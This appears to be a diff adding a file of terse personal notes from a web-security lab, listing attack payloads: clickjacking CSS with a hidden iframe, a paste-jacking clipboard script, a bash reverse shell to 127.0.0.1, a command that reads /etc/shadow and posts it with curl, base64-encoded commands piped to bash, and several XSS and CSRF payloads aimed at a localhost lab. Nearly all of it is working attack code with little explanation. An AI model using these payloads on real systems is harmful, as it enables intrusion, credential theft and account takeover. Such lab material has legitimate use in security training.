@@ -1,0 +1,109 @@
+Clickjacking:
+iframe{
+	opacity:0;
+	height:600px;
+}
+
+a{
+	position:absolute;
+	top:50px;
+	left:100px
+}
+
+<a href="http://google.com">google</a>
+30 tab after
+
+<iframe src="http://c"></iframe>
+
+
+Paste jacking:
+
+function copyStringToClipboard (str) {
+   var el = document.createElement('textarea');
+   el.value = str;
+   el.setAttribute('readonly', '');
+   el.style = {position: 'absolute', left: '-9999px',opacity:0};
+   document.body.appendChild(el);
+   el.select();
+   document.execCommand('copy');
+   document.body.removeChild(el);
+}
+copyStringToClipboard("salam");
+
+
+
+
+
+ls | bash -i >& /dev/tcp/127.0.0.1/2222 0>&1
+
+ls -la ; c=`cat /etc/shadow` ; curl -X POST http://localhost/1.php -d "d=$c"
+
+
+echo "bHMgLWxhCg=="  | base64 -d | bash
+printf "\u0077\n" | bash 
+printf "\x77\n" | bash
+
+
+<iframe src=http://nodejs-dev.ir></iframe>
+
+
+
+http://www.bloody.com/en/product.php?pid=salam">sss</a>salam2<a href=javascript:eval(atob(`YWxlcnQoYGhhY2shYCk7`)); style=font-size:80px;color:%23fff>hack me</a>
+
+
+alert(`hack!`);
+javascript:eval(atob(`YWxlcnQoYGhhY2shYCk7`));
+
+
+Cross-Site Request Forgery :
+change password
+add admin
+bypass payment
+
+12345QWQEQR
+download.php?id=1000 -> pay -> 5000 -> file download
+download.php?id=5000 -> pay -> 5000 -> file download
+XSRF:
+	1 - found xss 
+	2 - js - link - xhr
+	
+http://localhost/labs/csrf/03.php?fn=<script>alert('hack')</script>&btn_send=1
+
+
+
+
+
+
+document.forms[0].elements[0].value="ali";
+document.forms[0].elements[1].value="ali"
+document.forms[0].elements[2].click();
+
+
+<script>document.forms[0].elements[0].value="ali";document.forms[0].elements[1].value="ali";document.forms[0].elements[2].click();</script>
+
+
+
+
+http://localhost/labs/csrf/03.php?fn=<script>document.forms[0].elements[0].value="ali";document.forms[0].elements[1].value="ali";document.forms[0].elements[2].click();</script>
+&btn_send=1
+
+
+
+&lt;img src=1 onerror=alert(1)&gt;
+&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
+&lt;img src=&quot;#&quot; onerror=&quot;alert(1)&quot;&gt;
+<ali:script xmlns:ali="http://www.w3.org/1999/xhtml">alert(1)</ali:script>
+<html xmlns='http://www.w3.org/1999/xhtml'><script>alert('xss')</script></html>
+
+
+
+
+
+
+
+
+
+
+
+
+
